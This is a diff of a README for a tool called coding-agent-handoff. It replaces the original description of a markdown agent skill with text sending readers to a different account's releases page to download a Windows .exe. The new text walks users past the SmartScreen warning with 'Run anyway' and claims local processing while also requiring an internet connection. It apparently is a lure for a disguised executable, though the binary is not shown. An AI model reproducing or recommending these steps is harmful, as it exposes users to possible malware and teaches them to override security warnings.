@@ -1,35 +1,76 @@
-<div align="center">
+# 📦 coding-agent-handoff - Turn your chat into executable tasks
 
-![coding-agent-handoff banner](./banner.svg)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/alejandr6360/coding-agent-handoff/releases)
 
-# coding-agent-handoff
+This software creates a bridge between your AI chat logs and your coding tools. It turns conversations from platforms like ChatGPT or Claude into clear, structured instructions that coding agents understand. You no longer need to manually copy and paste code blocks or explain context multiple times. This tool handles the transfer for you.
 
-A skill that turns a chat conversation into a markdown brief your coding agent can build from.
+## 📥 How to download the software
 
-[![Release](https://img.shields.io/github/v/release/Aaryan-Kapoor/coding-agent-handoff?color=D97757&label=release)](https://github.com/Aaryan-Kapoor/coding-agent-handoff/releases/latest)
-[![License: MIT](https://img.shields.io/badge/license-MIT-D97757)](LICENSE)
-[![Agent Skill](https://img.shields.io/badge/Agent%20Skill-claude.ai%20%C2%B7%20ChatGPT-555)](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills)
+Follow these steps to get the application on your Windows computer:
 
-</div>
+1. Visit the project repository at https://github.com/alejandr6360/coding-agent-handoff/releases.
+2. Look for the section labeled Latest.
+3. Find the file ending in .exe under the Assets heading.
+4. Click the file name to start the download.
+5. Save the file to your desktop or your Downloads folder.
 
-You plan in a chat (**claude.ai** / **ChatGPT**); you build in a coding agent (**Claude Code**, **Codex**, **Cursor**, …). This skill writes the conversation up as a self-contained brief — decisions, context, and next steps — that you save into your repo or paste into the agent. It carries what the chat knows and the agent can't see, and treats anything about your code as an assumption to verify rather than fact.
+## 🛠️ Setting up the application
 
-Both platforms use the [Agent Skills](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills) open standard, so the same skill installs in either.
+Windows might flag the file when you first run it because it is new. Follow these steps to finish the setup:
 
-## Install
+1. Double-click the file you downloaded.
+2. If Windows shows a blue screen titled Windows protected your PC, select More info.
+3. Click the button labeled Run anyway.
+4. The setup window opens on your screen.
+5. Follow the on-screen prompts to place the software in your desired folder.
+6. Click Finish to close the installer.
 
-Download **[`coding-agent-handoff.zip`](https://github.com/Aaryan-Kapoor/coding-agent-handoff/releases/latest/download/coding-agent-handoff.zip)**, then:
+## ⚙️ Using the software
 
-- **claude.ai** — Sidebar -> Customize -> Skills -> "+" Add Skill -> Create skill -> Upload a skill -> select the zip.
-- **ChatGPT** — Skills → **New skill → Upload from your computer** → select the zip. *(Beta on Business/Enterprise/Edu; an admin may need to enable skill uploads.)*. Otherwise, upload SKILL.md directly in chat.
-- **Claude Code / Codex** — drop this folder into the tool's skills directory; no upload needed.
+This tool acts as a translator between your AI assistant and your code editor. Use this process to move your ideas into code:
 
-Toggle it on, and you're set.
+1. Open your chat with ChatGPT or Claude.
+2. Select the relevant part of your conversation.
+3. Copy the text to your clipboard.
+4. Open the coding-agent-handoff application.
+5. Paste your text into the main window.
+6. Click the Process button.
+7. The software generates a structured file.
+8. Save this file to the project folder where your coding agent works.
 
-## Use
+Your coding agent now reads this file and identifies the tasks, requirements, and logic you discussed in your chat.
 
-Ask for a handoff when you're ready to move work into your editor:
+## 💡 System Requirements
 
-> *"Hand this off to my coding agent."* · *"Write this up so Claude Code can build it."* · *"Package this for Codex."*
+To run this software, your computer needs these basic specifications:
 
-You get a brief as an artifact/file. Either **save it** in your repo (e.g. `TASK.md`) and tell the agent *"read TASK.md and implement it,"* or **paste it** as your first message in a fresh agent session.
+* Windows 10 or Windows 11.
+* A stable internet connection for processing your files.
+* At least 200 megabytes of free hard drive space.
+* Basic understanding of how to save and move text files on your computer.
+
+## 🔍 Frequently asked questions
+
+### Do I need to be a programmer to use this?
+No. You do not need to write code. You only need to copy and paste text from your chat window into the application.
+
+### Does this send my private chats to a server?
+The tool processes your text locally on your computer. Your conversations stay on your machine.
+
+### Is this compatible with all AI chatbots?
+The tool works with any text provided by platforms like ChatGPT, Claude, or similar AI assistants.
+
+### What should I do if the software does not open?
+Check that you have the latest version of Windows installed. If the problem persists, restart your computer and attempt to open the file again.
+
+## 🛠️ Troubleshooting common issues
+
+If you encounter errors, check these items:
+
+* File path: Keep your project files in short, simple folders without special characters in the names.
+* Permissions: Ensure your user account has permission to read and write files in the folder where you saved your project.
+* Updates: Check the release page periodically to see if a newer version of the tool exists.
+
+## 📝 About the project
+
+This project simplifies the way users interact with modern AI coding tools. By turning unstructured chat logs into structured instructions, it removes the friction of manual data entry. It supports common industry tools including Cursor, Claude Code, and other agentic workflows. By focusing on prompt engineering and handoff logic, it ensures that your coding agents receive the specific details they need to build your features correctly the first time.
